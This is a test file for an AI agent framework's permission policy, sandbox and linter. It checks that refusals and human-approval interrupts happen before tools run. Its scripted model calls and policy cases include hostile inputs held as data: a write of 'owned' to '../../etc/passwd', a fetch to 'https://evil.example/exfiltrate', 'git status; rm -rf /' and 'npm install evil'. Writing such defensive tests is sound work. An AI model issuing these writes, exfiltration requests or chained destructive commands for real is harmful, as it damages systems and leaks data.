/**
 * Capabilities, permission policies, and the sandbox contract. The policy is proved in a real agent
 * tool loop: a write outside the workspace and a request to an unlisted host are refused before the
 * tool runs, and a granted command that needs approval interrupts until a person answers.
 */
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { after, test } from 'node:test';
import { createAgent, agentInput } from '../src/agent/create-agent.js';
import { capabilitiesOf, isSensitiveCapability, parseCapability } from '../src/agent/capabilities.js';
import { normalizePath, permissionPolicy } from '../src/agent/permissions.js';
import {
  processSandbox,
  runSandboxConformance,
  type Sandbox,
  SandboxPathError,
  sandboxTools,
} from '../src/agent/sandbox.js';
import { tool } from '../src/agent/tool.js';
import { MemoryGraphCheckpointer } from '../src/graph/checkpointer.js';
import { appendList } from '../src/graph/channels.js';
import { createGraph } from '../src/graph/graph.js';
import { lintGraph } from '../src/graph/lint.js';
import { END } from '../src/types/graph.js';
import type { CompletionRequest } from '../src/types/messages.js';
import type { NexusResponse } from '../src/types/response.js';

const scratch = mkdtempSync(path.join(tmpdir(), 'nexus-permissions-'));
after(() => rmSync(scratch, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 }));

function scriptedClient(responses: Array<Partial<NexusResponse>>) {
  const requests: CompletionRequest[] = [];
  let index = 0;
  return {
    requests,
    client: {
      complete: async (request: CompletionRequest): Promise<NexusResponse> => {
        requests.push(structuredClone({ ...request, tools: undefined }) as CompletionRequest);
        const scripted = responses[Math.min(index, responses.length - 1)] ?? {};
        index += 1;
        return {
          content: '',
          role: 'assistant',
          finishReason: 'stop',
          meta: {} as never,
          ...scripted,
        } as NexusResponse;
      },
    },
  };
}
const call = (id: string, name: string, args: unknown) => ({
  id,
  type: 'function' as const,
  function: { name, arguments: JSON.stringify(args) },
});

test('capabilities parse into kind, access, and target, and only reads are not sensitive', () => {
  assert.deepEqual(parseCapability('filesystem:write:/workspace/a.txt'), {
    kind: 'filesystem',
    access: 'write',
    target: '/workspace/a.txt',
  });
  assert.deepEqual(parseCapability('filesystem:read'), { kind: 'filesystem', access: 'read' });
  assert.deepEqual(parseCapability('network:https://api.github.com/repos'), {
    kind: 'network',
    target: 'https://api.github.com/repos',
  });
  assert.deepEqual(parseCapability('shell:git status'), { kind: 'shell', target: 'git status' });
  assert.deepEqual(parseCapability('payments:refund'), { kind: 'payments', target: 'refund' });
  assert.equal(isSensitiveCapability('filesystem:read:/x'), false);
  for (const sensitive of ['filesystem:write', 'shell', 'code', 'network:x.com', 'payments']) {
    assert.equal(isSensitiveCapability(sensitive), true, sensitive);
  }
  assert.equal(capabilitiesOf({ capabilities: [] }, {})?.length, 0, 'an empty list is a pure tool');
  assert.equal(capabilitiesOf({}, {}), undefined, 'no list is undeclared');
  assert.equal(
    capabilitiesOf(
      {
        capabilities: () => {
          throw new Error('bad args');
        },
      },
      {},
    ),
    undefined,
    'a function that throws declares nothing',
  );
  assert.equal(normalizePath('/workspace/../etc/passwd'), '/etc/passwd');
  assert.equal(normalizePath('src\\..\\..\\x', '/workspace'), '/x');
  assert.equal(normalizePath('a\0b'), null);
});

test('a policy grants paths, hosts, and commands, and asks or denies everything else', () => {
  const policy = permissionPolicy({
    filesystem: { read: ['/workspace/**'], write: ['/workspace/output/**'] },
    network: { allow: ['api.github.com', '*.openai.com'] },
    shell: { allow: ['git', 'npm test'] },
    custom: { payments: 'ask', 'payments:refund': 'deny' },
    ask: ['shell:git push*'],
  });
  const decide = (capabilities: string[] | undefined, toolName = 'tool') =>
    policy.decide({ tool: toolName, args: {}, capabilities }).decision;

  assert.equal(decide(['filesystem:read:/workspace/src/a.ts']), 'allow');
  assert.equal(decide(['filesystem:read:/workspace']), 'allow', 'the directory itself');
  assert.equal(decide(['filesystem:write:/workspace/output/report.md']), 'allow');
  assert.equal(decide(['filesystem:write:/workspace/src/a.ts']), 'deny', 'read-only part of the workspace');
  assert.equal(decide(['filesystem:write:/workspace/output/../../etc/passwd']), 'deny', 'traversal is resolved first');
  assert.equal(decide(['filesystem:read:/workspace-other/x']), 'deny', 'a sibling with the same prefix');
  assert.equal(decide(['network:https://api.github.com/repos/x']), 'allow');
  assert.equal(decide(['network:chat.openai.com']), 'allow');
  assert.equal(decide(['network:openai.com']), 'deny', 'a wildcard covers subdomains, not the apex');
  assert.equal(decide(['network:evil.example']), 'deny');
  assert.equal(decide(['network']), 'deny', 'any host needs *');
  assert.equal(decide(['shell:git status']), 'allow');
  assert.equal(decide(['shell:git push origin main']), 'ask');
  assert.equal(decide(['shell:npm test']), 'allow');
  assert.equal(decide(['shell:npm install evil']), 'deny');
  assert.equal(decide(['shell:git status; rm -rf /']), 'deny', 'chaining is never granted by a prefix');
  assert.equal(decide(['shell:git log | head']), 'deny');
  assert.equal(decide(['code']), 'deny');
  assert.equal(decide(['payments:charge']), 'ask');
  assert.equal(decide(['payments:refund']), 'deny');
  assert.equal(decide(undefined), 'deny', 'an undeclared tool');
  assert.equal(decide([]), 'allow', 'a pure tool');
  assert.equal(decide(['filesystem:read:/workspace/a', 'network:evil.example']), 'deny', 'any denial wins');
  assert.equal(
    permissionPolicy({ tools: { calculator: 'allow' } }).decide({
      tool: 'calculator',
      args: {},
      capabilities: undefined,
    }).decision,
    'allow',
  );
  assert.match(
    policy.decide({ tool: 'w', args: {}, capabilities: ['network:evil.example'] }).reason,
    /evil\.example is not granted/,
  );
});

test('in a real tool loop, the policy refuses before a tool runs and interrupts for approval', async () => {
  const sandbox = processSandbox({ root: path.join(scratch, 'loop') });
  const fetched: string[] = [];
  const fetchUrl = tool({
    name: 'fetch_url',
    description: 'Fetches a URL',
    parameters: { type: 'object', properties: { url: { type: 'string' } } },
    capabilities: (args: { url?: string }) => [`network:${args.url ?? ''}`],
    execute: (args: { url?: string }) => {
      fetched.push(String(args.url));
      return 'page';
    },
  });
  const { client, requests } = scriptedClient([
    {
      content: '',
      toolCalls: [
        call('c1', 'write_file', { path: '../../etc/passwd', content: 'owned' }),
        call('c2', 'write_file', { path: 'output/report.md', content: '# Report' }),
        call('c3', 'fetch_url', { url: 'https://evil.example/exfiltrate' }),
        call('c4', 'fetch_url', { url: 'https://api.github.com/repos/x' }),
        call('c5', 'run_command', { command: 'git --version' }),
      ],
    },
    { content: 'Done.' },
  ]);
  const agent = createAgent({
    client,
    tools: [...sandboxTools(sandbox), fetchUrl],
    permissions: permissionPolicy({
      filesystem: { read: ['/workspace/**'], write: ['/workspace/output/**'] },
      network: { allow: ['api.github.com'] },
      shell: { allow: ['git'] },
      ask: ['shell'],
    }),
    checkpointer: new MemoryGraphCheckpointer(),
  });

  const paused = await agent.invoke(agentInput('Write the report'), { threadId: 'loop' });
  assert.equal(paused.status, 'awaiting_input', 'the granted command waits for a person');
  const question = paused.interrupt?.payload as { name: string; capabilities: string[]; permission: string };
  assert.equal(question.name, 'run_command');
  assert.deepEqual(question.capabilities, ['shell:git --version']);
  assert.match(question.permission, /needs approval/);
  assert.equal(await sandbox.readFile('output/report.md'), '# Report', 'the granted write ran');
  await assert.rejects(sandbox.readFile('../../etc/passwd'), SandboxPathError);
  assert.deepEqual(fetched, ['https://api.github.com/repos/x'], 'the unlisted host was never called');

  const done = await agent.resumeWith('loop', true);
  assert.equal(done.status, 'completed');
  const results = done.state.messages
    .filter((message) => message.role === 'tool')
    .map((message) => String(message.content));
  assert.ok(results.some((text) => /Permission denied: filesystem:write:\/etc\/passwd is not granted/.test(text)));
  assert.ok(
    results.some((text) => /Permission denied: network:https:\/\/evil\.example\/exfiltrate is not granted/.test(text)),
  );
  assert.ok(
    results.some((text) => /"exitCode":0/.test(text)),
    'the approved command ran',
  );
  assert.ok(requests.length >= 2);
});

test('an approver who edits the arguments cannot reach what the policy denies', async () => {
  const sandbox = processSandbox({ root: path.join(scratch, 'edit') });
  const { client } = scriptedClient([
    { toolCalls: [call('c1', 'write_file', { path: 'output/a.md', content: 'a' })] },
    { content: 'ok' },
  ]);
  const agent = createAgent({
    client,
    tools: sandboxTools(sandbox, { shell: false }),
    permissions: permissionPolicy({ filesystem: { write: ['/workspace/output/**'] }, ask: ['filesystem:write'] }),
    checkpointer: new MemoryGraphCheckpointer(),
  });
  await agent.invoke(agentInput('write'), { threadId: 'edit' });
  const done = await agent.resumeWith('edit', { approved: true, args: { path: '../outside.md', content: 'x' } });
  const result = done.state.messages.find((message) => message.role === 'tool');
  assert.match(String(result?.content), /Permission denied/);
  await assert.rejects(sandbox.readFile('../outside.md'), SandboxPathError);
});

test('the linter reports a sensitive tool with no approval, an undeclared one, and an effect before an interrupt', () => {
  const { client } = scriptedClient([{ content: 'ok' }]);
  const shellTool = tool({
    name: 'shell',
    description: 'Runs commands',
    parameters: { type: 'object' },
    capabilities: ['shell'],
    execute: () => 'ran',
  });
  const mystery = tool({
    name: 'mystery',
    description: 'Does something',
    parameters: { type: 'object' },
    execute: () => 1,
  });
  const pure = tool({
    name: 'add',
    description: 'Adds',
    parameters: { type: 'object' },
    capabilities: [],
    execute: () => 2,
  });
  const unguarded = lintGraph(createAgent({ client, tools: [shellTool, mystery, pure] }));
  assert.deepEqual(
    unguarded.filter((finding) => finding.code.includes('TOOL')).map((finding) => [finding.code, finding.node]),
    [
      ['SENSITIVE_TOOL_WITHOUT_APPROVAL', 'tool:shell'],
      ['UNDECLARED_TOOL_CAPABILITIES', 'tool:mystery'],
    ],
  );
  assert.equal(
    lintGraph(createAgent({ client, tools: [shellTool] }), { deployed: true }).find(
      (finding) => finding.code === 'SENSITIVE_TOOL_WITHOUT_APPROVAL',
    )?.severity,
    'error',
  );
  const guarded = lintGraph(createAgent({ client, tools: [shellTool], permissions: permissionPolicy({}) }));
  assert.equal(
    guarded.some((finding) => finding.code === 'SENSITIVE_TOOL_WITHOUT_APPROVAL'),
    false,
  );
  const approved = lintGraph(createAgent({ client, tools: [shellTool], interruptOn: { shell: true } }));
  assert.equal(
    approved.some((finding) => finding.code === 'SENSITIVE_TOOL_WITHOUT_APPROVAL'),
    false,
  );

  const graph = createGraph({ channels: { log: appendList<string>() } })
    .addNode('charge', () => ({ log: ['charged'] }), { effects: ['payments:charge'], interrupts: true })
    .addNode('safe', () => ({ log: ['ok'] }), { effects: ['payments:charge'], interrupts: true, idempotent: true })
    .addEdge('charge', 'safe')
    .addEdge('safe', END)
    .setEntry('charge')
    .compile();
  assert.deepEqual(
    lintGraph(graph)
      .filter((finding) => finding.code === 'SIDE_EFFECT_BEFORE_INTERRUPT')
      .map((finding) => finding.node),
    ['charge'],
  );
  assert.deepEqual(graph.describe().nodes[0]?.effects, ['payments:charge']);
});

test('the process sandbox passes the conformance suite, and a leaky one fails the checks it breaks', async () => {
  const report = await runSandboxConformance(() => processSandbox({ root: path.join(scratch, 'conformance') }));
  assert.equal(report.passed, true, JSON.stringify(report.checks, null, 2));
  assert.equal(report.checks.length, 7);
  assert.deepEqual(processSandbox({ root: scratch }).isolation, {
    filesystem: false,
    network: false,
    processes: false,
  });

  const real = processSandbox({ root: path.join(scratch, 'leaky') });
  const leaky: Sandbox = {
    ...real,
    name: 'leaky',
    exec: (command, options) =>
      real.exec(command, { ...options, env: { ...(process.env as Record<string, string>), ...options?.env } }),
    writeFile: async (file, content) => {
      const { writeFile, mkdir } = await import('node:fs/promises');
      const target = path.resolve(path.join(scratch, 'leaky'), file);
      await mkdir(path.dirname(target), { recursive: true });
      await writeFile(target, content);
    },
  };
  const failed = await runSandboxConformance(() => leaky);
  assert.equal(failed.passed, false);
  assert.deepEqual(
    failed.checks.filter((check) => !check.ok).map((check) => check.name),
    ['a command gets the variables it is given, and none of the host', 'a path outside the sandbox is refused'],
  );
});
